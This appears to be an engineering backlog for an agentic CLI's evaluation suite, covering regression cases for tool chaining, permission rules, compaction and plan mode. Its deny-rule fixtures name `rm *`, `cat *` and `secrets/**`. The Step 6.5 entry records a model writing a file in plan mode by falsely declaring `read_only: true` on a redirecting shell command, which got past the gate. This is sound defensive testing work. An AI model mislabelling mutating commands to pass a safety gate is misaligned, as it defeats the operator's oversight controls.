  flat 100%-pass threshold across providers. Two
  options:
  1. Per-provider thresholds: 100% on Haiku, ≥85% on
     gpt-4o-mini.
  2. Provider-agnostic core suite + provider-specific
     extension cases: cases known to be model-strength
     dependent live in a sibling tier
     (`evals/regression-frontier/`?).
  Option 2 is conceptually cleaner; option 1 ships
  faster. Defer the choice to when CI gate is
  actually being wired (it's not blocking M3 progress).
- **Case 23's `maxSteps: 14` stays.** Bumping to 20+
  to satisfy gpt-4o-mini would let the case pass on
  any provider regardless of efficiency. The point of
  step budgets is exactly to detect inefficient
  completion paths. Same model-capability-disclosure
  argument.
- **No new harness features required.** Confirmed
  during the run that everything we need is already
  there: NDJSON output, per-case aggregates, variance
  reporting. The only operational improvement is a
  `--timeout-ms` flag that already exists; using it
  per-provider in baseline runs is a doc convention,
  not a code change.

**Cut (kept the close tight):**

- **No live re-categorization of cases into tiers.**
  Sliding cases 12, 23, 28, 30 into a "frontier-only"
  tier today would require both a directory move AND a
  decision on the per-provider gate semantics. Both
  defer to CI-gate work (TODO.md). Today the cases
  stay in `evals/regression/` and the parity matrix
  documents the divergence.
- **No expansion to ~100 cases.** The original Step 1
  target. Reaching 100 means scaling each batch by ~3×.
  Lesson learned in 1.6: scaling cases without
  scaling provider coverage means accumulating
  Haiku-only coverage. Better to scale providers
  next (e.g., add Sonnet 4.6 to the parity matrix —
  cheap, faster, and validates the Anthropic family
  more thoroughly) before adding more cases.
- **No real-model run for case 23 with bumped
  maxSteps.** Validated separately at maxSteps:14 +
  timeout 180s — still exhausts on gpt-4o-mini. The
  capability gap is real, not a budget artifact.

**Pending (M3 next steps after Step 1):**

- M3 Step 2: pick the next subsystem from the M3
  scope: subagents, MCP, checkpoints+`/undo`,
  `bash_background`, `todo_write`, or Repo Map
  (tree-sitter). Priorities driven by which one
  blocks the most downstream work.
- Per-provider CI gate decision, when CI work
  resumes from `docs/TODO.md`.
- Case-tier resolution for divergent cases (option 1
  vs option 2 above) when CI gate lands.

**Risks documented:**

- **Haiku-only suites accumulate silently.** Today
  every regression case was authored against Haiku
  observability. Future cases written without a
  cross-provider sanity check will pile on more
  Haiku-only coverage. Mitigation: every new batch
  should run a 1-round gpt-4o-mini smoke check before
  closing the batch — the cost is trivial ($0.05 per
  35-case round).
- **gpt-4o-mini's chain-stopping pattern may
  generalize.** Cases 12, 28, 30 all fail on the
  same primitive: chain second-tool dispatch. If a
  future user runs Forja against gpt-4o-mini for a
  real workflow that depends on chained tool calls,
  they'll hit the same wall — and we'd rather they
  hit it in our regression suite than in production.
  The 0/3 result is the operator-facing signal:
  "this provider+model combination is not chain-safe
  on tool sequences."
- **The cost gap (9.8×) understates the value gap.**
  Pass rate adjusted: Haiku 4.5 effective cost per
  passed case ≈ $0.0076/case; gpt-4o-mini ≈ $0.0009/
  case but only 86.7% reliable. Quality-weighted, the
  ratio narrows substantially. This nuance belongs in
  M7 (hybrid profile) cost modeling — flagged here so
  the spec PR doesn't quote the raw 9.8× number.

**Spec reference:** `AGENTIC_CLI.md §16` (eval tiers,
golden traces), `PROVIDERS.md §7` (multi-model
first-class), `src/evals/cli.ts` (`--timeout-ms` flag).

---

## [2026-04-28] M3 / Step 1.5 — Regression batch 4: multi-tool flows

Continues M3 / Step 1 with batch 4 — 6 cases that
exercise multi-tool sequences and parallel dispatch. Total
in `evals/regression/` is now 35.

**Step 1.4 collapsed.** The original plan called Step 1.4
"provider adapter parity matrix" (re-run a subset under
OpenAI and Gemini). With Gemini deferred indefinitely
(see `docs/TODO.md`), and with the regression cases being
provider-agnostic by construction (the runner accepts
`--model` for any registered provider), the parity
"matrix" reduces to "run the suite under Anthropic, then
under OpenAI." That's a measurement task, not an authoring
task — it folds into Step 1.6 where we produce the real-
model baseline. Skipping 1.4 doesn't drop coverage; it
recognizes the work was always going to happen under a
different name.

**Why multi-tool flows matter:**

- Real workflows chain tools. Smoke and batches 1-3 are
  largely single-tool: each case proves "tool X works
  for behavior Y." Multi-tool exercises the seam — the
  tool_result of call N flows into the args of call N+1.
- Parallel dispatch (multiple tool_use blocks in one
  assistant turn) is a provider-adapter concern.
  Step 6.3 noted this "behaved correctly" for both
  Anthropic and OpenAI under smoke, but smoke never
  forces parallel dispatch — case 34 does.
- Edit-after-read is the modal refactor pattern; if it
  silently regressed, every code-modifying workflow
  would break and smoke would still pass.

**Done — cases 30-35:**

| # | Flow | Why this case |
|---|---|---|
| 30 | grep → edit_file | Find-and-fix workflow. Asserts the matched file is the one mutated, AND that edit_file (not write_file) was used — preserves the in-place semantics |
| 31 | read_file → write_file (derived) | Data-transformation pattern: read input.json, sum its array, write output.json. Asserts input is preserved verbatim, output contains the derived value |
| 32 | read_file → edit_file (same file) | Read-then-modify-based-on-contents: read version.txt (`41`), edit to `42`. The model's edit_file `old_string` must be derived from the prior read result. Catches a regression where tool_result content fails to round-trip into subsequent tool args |
| 33 | glob → edit_file (one of N) | File-selection-then-mutation: glob finds 3 TS files; edit only `alpha.ts`; assert the other two are unchanged. Three negative `file_contains` assertions — the most defensive case in the batch |
| 34 | parallel tool_use (3 reads, 1 turn) | Explicit instruction to dispatch all three read_file calls in a SINGLE assistant turn. Provider adapters serialize parallel tool_use differently (Anthropic emits multiple tool_use blocks per content array; OpenAI emits a tool_calls array) — this case is the regression net for that adapter logic |
| 35 | glob → read ×N → write_file | 3-step chain. Glob finds 3 TS files, reads each, writes summary.txt with derived data (function return values per file). Asserts depth: 2-step works in cases 30-34, this proves 3-step composes |

**Cut (out of scope for this batch):**

- **No grep → write_file case.** Would test the same
  "tool A drives tool B" axis as case 30 with a
  weaker assertion (write creates new files; edit
  asserts the IN-PLACE constraint). Case 30 is
  strictly stronger.
- **No bash → file-tool chains.** Bash output as input
  to read_file is somewhat implicit in case 35
  (glob → read), and bash → write would test
  composition that's already covered by case 31's
  read → write pattern. Diminishing returns.
- **No 4-step chains.** If 3-step works, 4-step
  failing would be a budget issue
  (`maxSteps`/`maxToolErrors`), not a composition
  issue. Cases 35's 10-step budget already gives the
  model headroom; deeper chains pay for themselves
  only when concrete bugs appear.

**Decisions:**

- **Case 31 uses `[10, 20, 30, 40]` summing to 100.**
  Picked deliberately: `100` is short enough for
  `output_contains` to be unambiguous (no ambient `100`
  in the prompt or fixture), and the math is trivial
  enough that arithmetic errors aren't a model-skill
  test. If a model can't sum 4 small integers, it has
  bigger problems than the harness.
- **Case 32's `41 → 42` is intentional.** `42` is
  unique in the fixture (input is `41`, no other 42s
  exist anywhere in setup). The increment is the
  smallest-possible derived computation — same
  philosophy as case 31, isolating the harness from
  model arithmetic skill.
- **Case 33 asserts unchanged files explicitly.** Three
  separate `file_contains` assertions on the
  not-edited files. Slight assertion bloat but worth
  it: a regression where the model edits the WRONG
  file (e.g., picks delta.ts because of alphabetical
  confusion) would otherwise pass — assertion on the
  target alone wouldn't catch the collateral mutation.
- **Case 34 trusts the model on parallel dispatch.**
  The prompt is explicit ("emit all three read_file
  calls in a SINGLE assistant turn"). If a provider
  adapter regresses — say, splits parallel tool_use
  into sequential calls under the hood — the case
  still passes (3 sequential reads also yields the
  three colors in output). This case proves the
  end-to-end semantics, not the wire-level dispatch
  shape. The wire-level test is in unit coverage
  (`tests/providers/*-stream.test.ts`).

**Pending (Step 1.6):**

- Real-model baseline run across the full 35-case
  suite under Anthropic (Haiku 4.5) and OpenAI
  (gpt-4o-mini), 3 rounds each. Decisions to make at
  that point:
  1. Cost envelope: 35 × ~$0.005 × 3 = ~$0.50 per
     provider per baseline. Acceptable.
  2. Wall-clock: 35 × ~5s × 3 ≈ 8min serial — close
     to the spec target (<10min). Parallelism still
     deferred unless this exceeds.
  3. Drop list: any case that fails reliably across
     rounds for model-behavior reasons (not harness
     bugs) gets pulled per the Step 6.5 honesty pass.

**Risks documented:**

- **Case 34 may not actually parallel-dispatch.**
  Models sometimes ignore the "single turn" hint and
  serialize anyway, especially smaller ones. The
  case still passes via the output assertions
  (sequential reads also produce all three colors),
  but the test is silently weaker than intended. If
  we want to force parallel dispatch as a hard
  invariant, we'd need a new `parallel_tool_use`
  expectation kind that asserts ≥2 tool_use blocks
  appeared in a single assistant message. Tracked
  here, not implemented — adding the expectation
  kind is a §1.7+ harness change.
- **Case 35's three-step chain is the longest in
  the suite.** If the model halts after step 2
  ("here's the data" without writing), the case
  fails on `file_exists: summary.txt`. The prompt
  is explicit about all three steps with numbered
  instructions; further hand-holding would feel
  test-gaming. If the case flakes, the right fix is
  at the suite-level summary (mark as flaky in the
  parity matrix) rather than rephrasing.
- **Case 33's negative assertions can mask reads.**
  `file_contains: src/beta/beta.ts pattern: return 2;`
  passes IF the file is unchanged OR if the model
  rewrote the file with the same content. Highly
  unlikely in practice, but flagging the assertion
  pattern: `file_contains` is presence, not absence
  of mutation. Only `tool_not_called: edit_file`
  would catch a no-op edit, but cases 30/32/33 all
  *want* edit_file to be called once. We accept
  this gap — a model that no-op-edits the wrong
  file is a regression class smoke wouldn't catch
  either.

**Spec reference:** `AGENTIC_CLI.md §7` (tool system),
`§7.1` (tools v1), `PROVIDERS.md` (parallel tool_use
adapter contract), `src/providers/*-stream.ts`
(per-provider parallel-dispatch normalization).

---

## [2026-04-28] M3 / Step 1.3 — Regression batch 3: compaction + plan mode

Continues M3 / Step 1 with batch 3 — 7 cases that
exercise compaction edge cases, plan-mode harness gates,
and the plan/policy gate composition. Total in
`evals/regression/` is now 29.

**Why this slice next:**

- Smoke covers ONE compaction (case 08, `min_count: 1`,
  `strategy: llm`). It does not cover: multiple
  compactions in a single run, the goal-reinjection
  layer's correctness, `preserveTail: 0` (most-aggressive
  fold), or compaction under `--plan`. Each is a real
  failure mode in the spec (`AGENTIC_CLI §6.1`,
  `CONTEXT_TUNING §3`).
- Plan mode smoke covers write_file blocking (case 05).
  edit_file uses a different harness code path
  (`invoke-tool.ts:175-195`); a regression there would
  pass smoke and ship broken. Edge case is worth a
  dedicated case.
- The plan/policy interaction has zero coverage outside
  unit tests. Subagents will extend the gate stack
  (sandbox, then plan, then policy, then hooks); pinning
  the existing two-layer composition NOW means future
  layer additions have a known-good baseline to compare
  against.

**Done — cases 23-29:**

| # | Subsystem | Why this case |
|---|---|---|
| 23 | compaction multi-round | `min_count: 2` — fixture forces ≥2 compactions by re-reading the chunky-modules tree twice. Catches a regression where the second compaction silently no-ops or deadlocks |
| 24 | compaction preserves goal | Embeds literal token `MARKER_24_GOAL_KEPT` in the prompt; asserts it survives in final output despite compaction firing. Tests the goal-reinjection layer (`compact*.ts:240-242` "subsequent compactions must see the ORIGINAL goal") under load |
| 25 | `preserveTail: 0` | Most-aggressive fold: every middle turn becomes summary, no literal tail preserved. Asserts the run still completes to `status: done` and reports the verbatim dependency. Catches a regression where preserve_tail=0 trips the alignment-shift edge (`loop.ts:482-484` `+ 2` accounting) |
| 26 | compaction under `--plan` | 4-axis intersection: plan + read_file ×5 + compaction triggered + plan markdown emitted. Catches regressions where compaction's LLM call somehow trips the plan-mode write gate (it shouldn't — different layer — but composition is exactly the kind of thing that breaks silently) |
| 27 | plan blocks edit_file | Symmetric with smoke 05 on the edit_file path. Different harness code (`invoke-tool.ts` plan-gate predicate), different deny message. Asserts greeting.txt content unchanged after the run |
| 28 | plan + multi-tool read-only chain | grep → read_file chain in plan mode, both pass plan-gate, plan markdown emitted. Negative side: write_file/edit_file not called. Documents that read tools chain freely under plan; the gate is precisely targeted at writes |
| 29 | plan + policy compose | The big one: plan: true + bash with read_only:true + policy `bash.deny: ['cat *']`. Plan-gate sees read_only and lets it pass; policy deny then fires. Asserts `tool_denied: bash` AND plan markdown present AND fixture file unchanged. Catches any regression where one gate silently swallows the other's decision |

**Cut (kept the slice tight):**

- **No `strategy: fallback` case.** Forcing the
  compaction LLM call to fail requires either provider
  fault injection (no surface today) or an unreachable
  network. Mock providers cover this in unit tests
  (`tests/harness/compact*.test.ts`); a real-model case
  would either flake on transient errors or never
  trigger the fallback path. `tool_denied`-style
  rigor: keep harness-internal behavior in unit tests;
  reserve regression for "model + harness end-to-end."
- **No `compaction-skipped` case.** When prompt
  doesn't exceed threshold, no compaction event fires.
  Asserting "no compaction" via absence is weaker than
  asserting presence, and the existing 8 cases without
  compaction triggers already implicitly exercise this
  path (they pass without firing compaction). Skipped
  is the default; default doesn't need a dedicated
  case.
- **No multi-strategy-mix case.** A run where
  compaction round 1 succeeds with `llm` and round 2
  falls back to `fallback` would be the highest-value
  test of the strategy field — but again, requires
  fault injection. Deferred to whenever the harness
  grows a strategy-override env var (`CONTEXT_TUNING`
  open question).

**Decisions:**

- **Fixture reuse over fixture proliferation.** Cases
  23, 24, 25, 26 all consume `chunky-modules`. The
  fixture was sized for one compaction; lowering
  `compactionThreshold` to 0.01 in case 23 forces two
  without changing the fixture. Ad-hoc threshold
  tuning per case keeps fixtures stable.
- **`MARKER_24_GOAL_KEPT` is intentionally weird.** The
  compactor's LLM-summarization step gets a goal that
  contains an explicit "must be honored in your FINAL
  message" instruction. If the summary correctly
  preserves the goal, the marker re-enters the
  context and the model echoes it. If the summary
  paraphrases the goal away (regression), the model
  has no source for the marker. The token's
  uniqueness (`MARKER_24_GOAL_KEPT` is a literal not
  found in any fixture or system prompt) means a hit
  on `output_contains` cannot come from anywhere
  else.
- **Case 29 frames the policy denial as expected.**
  The prompt explicitly says "the policy layer is a
  separate gate — it may block the command for its
  own reasons." Same Step 6.5 mitigation: model has
  permission to attempt the call (so policy gets to
  fire), and the prompt won't trip preemption
  defenses by sounding malicious.

**Pending (Step 1.4 onward):**

- 1.4: provider adapter parity matrix — re-run a
  selected subset of batches 1-3 under OpenAI and
  Gemini (when smoke unblocks), publish the matrix.
- 1.5: multi-tool flows (grep→edit, glob→write,
  bash→edit). Cross-tool sequences not yet tested.
- 1.6: real-model baseline across full ~100-case
  suite, 3 rounds, decide on parallelism.

**Risks documented:**

- **Case 23 budget tight at maxSteps: 14.** Reading
  10 files (5 × 2) plus model thinking turns may
  bump against the cap. If the case starts failing
  with `exhausted` instead of `done`, raise to 16.
  Tracked here so future debugging starts at the
  right knob.
- **Case 24 depends on instruction-following AND
  goal preservation.** Two failure modes that a
  single failed run can't distinguish:
  - Goal got dropped by the summarizer (harness
    bug) — the fix is in `compact*.ts`.
  - Goal preserved but model ignored the marker
    instruction (model bug) — drop the case.
  When this case starts failing, the next-step
  diagnosis is to read the audit log: did the
  post-compaction message stack contain
  `MARKER_24_GOAL_KEPT`? If yes, model-side; if no,
  harness-side. Documented here so the bisection
  is a transcript-read, not a binary search through
  prompt rewording.
- **Case 25's `preserveTail: 0` may break some
  models.** Without literal tail, the model relies
  entirely on its own summary of intent. Smaller
  models (gpt-4o-mini in our smoke set) may lose
  track of where they were in the sequence. If the
  case fails reliably on one provider but passes on
  another, that's a model capability divergence,
  not a harness bug — record it in the parity
  matrix (Step 1.4) and accept it.

**Spec reference:** `AGENTIC_CLI.md §5` (plan mode),
`§6.1` (compaction), `CONTEXT_TUNING.md §3` (preserve
parameters), `src/harness/compact*.ts` (goal preservation
implementation).

---

## [2026-04-28] M3 / Step 1.2 — Regression batch 2: permission engine

Continues M3 / Step 1.1 with batch 2 — 10 cases that
exercise the permission engine surface (`src/permissions/
engine.ts`). Each case ships its own
`.agent/permissions.yaml` via `setup.files`, which the eval
executor wires up automatically (`src/evals/executor.ts`
drops a default `bypass` policy only when the case+fixture
didn't provide one — see lines 108-115).

**Why permissions next:**

- Smoke runs entirely in default `bypass`. The engine has
  unit coverage but never round-tripped under load with a
  real model emitting tool calls under deny rules. M2's
  smoke proves "the model uses tools"; this proves "the
  model handles being told no."
- The engine is the surface that subagents (M3 next),
  MCP (M3+), and hooks (M4) layer on top of. Catching
  regressions here BEFORE those subsystems land means we
  know any future deny-class bug is in the layer above,
  not below.

**Done — cases 13-22 (numbered to extend batch 1):**

| # | Engine surface | Why this case |
|---|---|---|
| 13 | `defaults.mode: strict` + no rules → default deny | Bedrock invariant: empty strict = nothing allowed. Asserts `tool_denied` after the model tries — proves the gate fires, not just that the model preempted |
| 14 | `confirm_paths` + no UI → silent deny | Documents the M1-era behavior (`invoke-tool.ts:235-251`): confirm becomes `confirm_no` when no operator. Uses `file_not_exists` instead of `tool_denied` because the engine emits `kind: confirm`, not `deny` — cleanly distinguishes the two paths |
| 15 | `bash.allow` matches → allow | Positive case: the rule actually permits when intended. `echo *` with `read_only: true` |
| 16 | `bash.deny` wins over `bash.allow` | Asserts the deny-precedence invariant from `engine.ts:90-95` — gives the model BOTH `allow: ['*']` and `deny: ['rm *']`, expects `rm` denied |
| 17 | `write_file.deny_paths` blocks under `acceptEdits` | Confirms deny_paths fires even under acceptEdits (the most permissive non-bypass mode). `secrets/**` blocked despite `allow_paths: ['**']` |
| 18 | `write_file.allow_paths` permits under strict | Positive path-rule case: `*.md` allows `notes.md`. Mirror of #20 |
| 19 | `read_file.deny_paths` blocks reads | Symmetric with #17 for the read axis. Catches any future regression where deny_paths is silently treated as write-only |
| 20 | strict + write outside allow_paths → deny | Negative path-rule case: `*.md` rule does NOT cover `data.json`. Default deny under strict |
| 21 | acceptEdits + no rule → still deny | The single most likely confusion vector for users: "acceptEdits" sounds like "allow all edits". It's not — it auto-accepts `confirm_paths` matches but unmatched paths still deny (`engine.ts:172-175`). This case proves the engine matches the JSDoc |
| 22 | `bypass` short-circuits even deny rules | `engine.ts:221-223` returns `allow` before any rule runs. Asserts that adding a deny rule to a bypass policy is a no-op — important for operators who think they're "hardening" bypass with selective denies |

**Cut (bounded scope):**

- **No `confirm` decision via `tool_denied`.** The
  `tool_denied` expectation fires only on `kind: 'deny'`
  per `executor.ts:137-141`. Confirm decisions emit
  `kind: 'confirm'` and the harness layer turns them
  into `confirm_no` errors. Case 14 routes around this
  by asserting on `file_not_exists` directly. Adding
  a `tool_confirmed` expectation kind was considered
  and rejected — the existing surface is enough; one
  more discriminant would be paid for thinly until
  the M2 confirm-UI lands.
- **No FetchPolicy cases.** `web.fetch` is the engine
  category, but no `fetch_url` tool exists yet — the
  builtin tool surface stops at the 6 from M1. Coverage
  arrives when the tool does, not before.
- **No hierarchy cases (enterprise / user / project /
  session).** `src/permissions/hierarchy.ts` resolves
  layered policies, but eval cases ship a single
  `.agent/permissions.yaml` (the project layer). Real
  hierarchy testing needs multi-file fixtures and
  potentially HOME/XDG override surfaces — out of
  scope for batch 2, comes back when subagents start
  using the session layer.

**Decisions:**

- **Phrase prompts so the model attempts the call.**
  Step 6.5's lesson cuts here too: aligned models
  preempt suspicious requests. For deny-class cases
  (13, 16, 17, 19, 20, 21) the prompt explicitly says
  "report whatever the tool returns, even if it's a
  denial — do NOT switch tools, do NOT retry." The
  model needs to invoke the gated tool for the engine
  to deny it; if it preempts, `tool_denied` fails
  vacuously. Mitigation: model has no policy
  visibility (verified — policy doesn't leak into
  system prompt; checked `harness/loop.ts:206`), so it
  attempts naturally unless something in the prompt
  itself looks dangerous.
- **`acceptEdits` confusion gets its own case (#21).**
  This is the only spec-§8 nuance ("aceita edits sem
  confirmação") that consistently surprises operators
  reading the policy file. Ship it as a regression
  pinning the documented behavior so any future
  refactor that loosens it lights up red.
- **Loader-level guarantees re-validated implicitly.**
  Each `.agent/permissions.yaml` shipped via
  `setup.files` round-trips through
  `loadPolicyFromFile` at engine construction. A
  YAML key typo (`allow_path` singular) would crash
  the case at load time with the policy parser's
  rejection message — so these cases also prove the
  policy parser stays strict-but-tolerant under load.

**Pending (Step 1.3 onward):**

- Compaction edge cases: preserve-tail boundaries,
  fallback strategy when LLM call fails, multiple
  compactions in one run.
- Plan mode + multi-tool interleaving (plan + bash +
  edit attempt).
- Cross-cutting: bash deny when plan mode also active
  (which gate fires first?).

**Risks documented:**

- **Cases 13, 16, 17, 19, 20, 21 depend on the model
  attempting the call.** Same vector that bit Step 6.5.
  Mitigation in prompt phrasing above. Worst case: a
  case fails 0/3 because the model preempted on every
  round. The right response then is to drop the case
  (per the Step 6.5 honesty pass), not to tweak the
  prompt until it works — model-behavior tests vs
  harness-behavior tests stay separated.
- **Path glob semantics use `**` literally.** YAML
  parsers can be subtle about `**` inside flow scalars;
  block scalars (used here) sidestep the issue. If a
  future case writes the policy inline as a flow scalar
  and `**` interacts with anchors/aliases, the rule
  silently doesn't match. Pin the convention: always
  block-scalar policy YAMLs in `setup.files`.

**Spec reference:** `AGENTIC_CLI.md §8` (permission
engine), `§9` (trust & safety), `src/permissions/engine.ts`
(deny-precedence and bypass-shortcircuit invariants).

---

## [2026-04-28] M3 / Step 1.1 — Regression tier scaffold + first batch

Opens M3 by attacking the spec §16 mandate "regression
(~100 cases, < 10min) — todo PR" before subsystems that
will lean on it (subagents, MCP, checkpoints). Step 1.1 is
the first slice: scaffold `evals/regression/` and land a
first batch (~12-15) of cases that exercise tool surface
edge cases the smoke tier intentionally skips.

**Why this slice first:**

- The harness already supports any directory under
  `evals/`. Runner is uncoupled from naming convention
  beyond `*.yaml` extension (verified in `src/evals/cli.ts`
  `discoverCases`). So a regression tier needs no
  harness changes for the simplest path — just YAML.
- Subagents, MCP, checkpoints (the rest of M3) all add
  surfaces that need regression coverage. Building the
  tier *first* means those subsystems get born with a
  net under them, instead of retrofitting tests after
  the fact.
- Regression as a TIER also unlocks the CI gate item in
  `docs/TODO.md` once it stabilizes.

**Plan (stepwise):**

- 1.1 — scaffold + tool-depth batch (~12-15 cases). This
  entry.
- 1.2 — permission engine cases (deny/allow/ask hierarchy
  edges, `.agent/permissions.yaml` glob matching, prefix
  rules).
- 1.3 — compaction + plan mode edge cases (preserve-tail
  boundaries, fallback strategy when LLM call fails,
  plan mode + multi-tool interleaving).
- 1.4 — provider adapter parity matrix (same case across
  Anthropic / OpenAI / Gemini once Gemini smoke unblocks).
- 1.5 — multi-tool flows (glob→read, grep→edit, bash→write).

**Decisions to make explicit upfront:**

- **No real-model baseline run inside Step 1.1.** Writing
  cases and confirming they parse is one unit; running
  them against a paid provider is another. Cost
  envelope per real-model run scales with case count
  (15 cases × $0.005 ≈ $0.075/round; 100 cases × 3
  rounds ≈ $1.50). Real-model baseline lands in Step 1.6
  after the 5 batches stabilize, so the cost is paid
  once on a complete suite instead of paid 5 times on
  intermediate states.
- **Cases stay deterministic-by-design.** Avoid
  expectations that depend on model-specific phrasing
  (the Step 6.3 lesson: `output_contains: "hello world"`
  was a property of Haiku, not the harness). Prefer
  tool-call invariants (`tool_called`, `file_contains`,
  `file_exists`, `tool_denied`).
- **No new harness features in 1.1.** Parallelism (to
  hit the < 10min target with 100 cases) is a separate
  step. Today, regression runs serial like smoke.

**Spec reference:** `AGENTIC_CLI.md §16` (eval tiers),
`PROVIDERS.md §7` (multi-model first-class).

**Done:**

- New tier directory `evals/regression/` born with its
  first 12 cases. No `.gitkeep`, no README — the
  directory is created by the YAMLs themselves, mirroring
  the project rule that empty folders are noise.
- Cases (numbered for stable ordering, not for
  dependency):

  | # | Subsystem under test | Insight beyond smoke |
  |---|---|---|
  | 01 | `read_file` offset/limit | smoke reads whole file; this proves the line-window args round-trip through tool dispatch |
  | 02 | `read_file` missing path | error path; model must NOT fall back to write_file |
  | 03 | `write_file` deep nested dir | smoke writes at root; this proves intermediate dir creation |
  | 04 | `write_file` overwrite | smoke creates new file; this proves stale content gets replaced |
  | 05 | `edit_file` disambiguation | exercises the ambiguity-fail path: model must use surrounding context to pick one of two identical substrings |
  | 06 | `edit_file` missing pattern | error path; model must NOT fall back to write_file |
  | 07 | `grep` zero matches | empty-result path; model must NOT invent matches or write files |
  | 08 | `grep` real regex | proves regex (not literal) interpretation: `function\s+\w+` finds 3 names |
  | 09 | `glob` deep nesting | `**/*.ts` walks 3 directory levels |
  | 10 | `glob` zero matches | empty-result path; symmetric with 07 for the file-discovery axis |
  | 11 | `bash` piped command | `wc -l < file` exercises shell redirection in plan-friendly mode |
  | 12 | multi-tool glob→read | proves tool-call chaining: glob output drives read_file path |

- New fixture `evals/fixtures/nested-tree/` carries the
  3-level TS tree used by cases 08, 09, and 12 (one
  fixture, three cases — keeps fixtures tight). Inline
  `setup.files` covers the 6 cases (01, 04, 05, 06, 11,
  and 03 implicitly via writes to a fresh workspace) where
  a one-liner file is enough — fixture dirs are reserved
  for trees with structure.
- All 12 YAMLs verified to load through
  `src/evals/loader.ts` without a single parse error.
  Loader-level invariants exercised:
  - inline `setup.files` paths (relative-only, no `..`)
  - `tool_called` / `tool_not_called` / `file_contains` /
    `file_exists` / `file_not_exists` / `output_contains`
    / `status` discriminants
  - YAML literal block (`|`) for multi-line file content
- `bun run typecheck`, `bun run lint`, and `bun test`
  all green (625 pass, 0 fail) — no source touched, no
  drift introduced.

**Cut (kept the slice tight):**

- **No README in `evals/regression/`.** CLAUDE.md
  prohibits unsolicited markdown docs; the convention is
  documented here in BACKLOG and self-evident in the
  YAMLs themselves. If a second contributor lands and
  asks "what goes in regression vs smoke?", that's the
  signal to write the README — pre-writing it would be
  speculative documentation.
- **No real-model baseline run.** Confirmed in the
  opening entry above — paying $0.30+ for a 12-case
  Haiku baseline today, then re-paying it after each of
  the 4 remaining batches lands, would cost ~$1.50
  unnecessarily. Single baseline run gates Step 1.6
  (closes the regression tier) instead.
- **No new harness features.** Considered adding a
  `--tier` shorthand (`bun run eval:regression`) but
  the existing CLI already accepts a directory arg, so
  `bun run eval -- evals/regression` works today. A
  shorthand is shoe-leather; deferred until the tier
  proves it deserves one.

**Decisions:**

- **Determinism over model-style assertions.** Every
  case asserts on harness-observable facts
  (`tool_called`, `file_contains`, `status: done`) plus
  at most a single `output_contains` fragment that's a
  literal echo of fixture content (e.g., `line three`,
  `alpha.ts`). No assertions on phrasing, sentence
  structure, or summarization style. This is the Step
  6.3 lesson applied at scale: provider divergence is
  guaranteed; we only assert on what the harness sees.
- **Negative tool calls (`tool_not_called`) earn their
  weight.** Cases 02, 06, 07, and 10 all pair the
  positive `tool_called` with a `tool_not_called:
  write_file` to defend against the failure mode where
  a model "fixes" a missing file/pattern by writing
  one. The `code-with-todos` fixture in cases 07 and
  10 is read-only by intent — any write_file invocation
  is a regression.
- **Inline files vs fixture dirs.** Drew the line at
  "does the case need >1 file or directory structure?"
  Yes → fixture. No → inline. Keeps cases readable
  without forcing a fixture dir for every single-file
  scenario.

**Pending (Step 1.2 onward):**

- Permission engine cases (deny/allow/ask hierarchy
  edges, `.agent/permissions.yaml` glob matching).
- Compaction + plan mode edge cases.
- Provider adapter parity matrix (waits on Gemini smoke
  unblock — see `docs/TODO.md`).
- Multi-tool flows beyond glob→read (grep→edit,
  bash→write, plan→summarize).
- Step 1.6: real-model baseline across the full
  ~100-case suite, 3 rounds, decide on parallelism.

**Risks documented:**

- **Suite size will eventually need parallelism.** At
  ~5s per case serial (smoke baseline), 100 cases × 3
  rounds = 25 minutes. Spec target is < 10min. Step
  6.3's smoke is round-major precisely so prompt-cache
  helps; that's not enough at 100 cases. Worker pool
  with N=4 is the obvious next step but introduces
  ordering nondeterminism in the NDJSON output, which
  the existing aggregate logic doesn't account for.
  Tracked as Step 1.7-or-later.
- **Inline `setup.files` heredocs accumulate.** 6 of 12
  cases use them. If a future case wants the same
  multi-line file, copy-paste tax grows. Rule of
  three: the third copy of any inline body promotes to
  a fixture.

---

## [2026-04-28] M2 / Step 6.5 — Plan-mode bash gate: limit found, scope honest

A code-review observation (`bash` marked `planSafe: true` could
silently allow `echo x > file` in plan mode) led to a fix: turn
`planSafe` into a predicate that requires `args.read_only === true`.
A negative smoke case written to verify the fix promptly proved
the predicate is **insufficient**: Haiku 4.5 in plan mode sent
`{ command: "echo \"should-not-write\" > exfil.txt", read_only: true }`
and the harness gate accepted because the model declared intent.
File got written.

This entry records both the fix that landed AND the limit it
hits, so future hardening doesn't repeat the same false-confidence
pattern.

**Done (the fix):**

- `ToolMetadata.planSafe` extended from `boolean` to
  `boolean | ((args: Record<string, unknown>) => boolean)`.
  Predicate form lets each tool author encode per-call intent
  validation. Predicate that throws fails closed; strict
  `=== true` rejects truthy-but-not-true values.
- `bash` switched from `planSafe: true` to
  `planSafe: (args) => args.read_only === true`. Model must
  declare intent on every plan-mode bash call.
- Plan-mode system prompt updated with explicit instruction:
  "bash MUST set `read_only: true` on every call. Bash without
  it is blocked the same way write_file is. Do not pipe to files,
  use redirects (`>`, `>>`, `tee`), or run mutating subcommands."
- Deny reason and model-facing message tailored: predicate
  failure says "add `read_only: true` to args, retry";
  unconditional block says "describe in plan instead".
- Audit trail preserved (tool_call + denied approval row).
- Unit tests: 4 new in `tests/harness/invoke-tool.test.ts`
  (predicate allows on satisfy, blocks on miss, strict equality
  for truthy values, fail-closed on throw).
- New eval expectation kind `tool_denied: <toolname>` —
  general-purpose, asserts the tool was invoked AND a deny
  decision fired (catches regressions where a guard silently
  starts allowing what it was meant to block). Uses
  `tool_decided` events; correlates by toolUseId.
- New `tool_denied` expectation kind (general-purpose; useful
  for future negative cases across permissions/hooks/MCP).

**Done (the honesty):**

- `ToolMetadata.planSafe` and `HarnessConfig.planMode` JSDoc
  rewritten to be explicit: predicate form is best-effort, not
  a security boundary; `writes: true` + omitted predicate is
  bullet-proof. Documents the observed Haiku failure inline so
  future contributors see the concrete failure mode, not just a
  caveat.

**Cut (two iterations of overreach):**

1. **First attempt** — `09-plan-mode-bash-write-blocked.yaml`:
   asserted the bash predicate catches mutating commands.
   Failed under Haiku immediately (model sent
   `{ command: "echo > exfil.txt", read_only: true }`,
   gate accepted, file written). Predicate is best-effort,
   not security. Removed; documented as the motivating
   evidence for the JSDoc honesty pass.
2. **Second attempt** — `09-plan-mode-write-tool-denied.yaml`:
   pivoted to the bullet-proof gate (write_file with no
   predicate, unconditional deny). Passed 3/3 on Haiku.
   Failed 0/3 on gpt-4o-mini — different mechanism: GPT
   reads the plan-mode system prompt's "write_file is
   BLOCKED" instruction and **preempts by never invoking
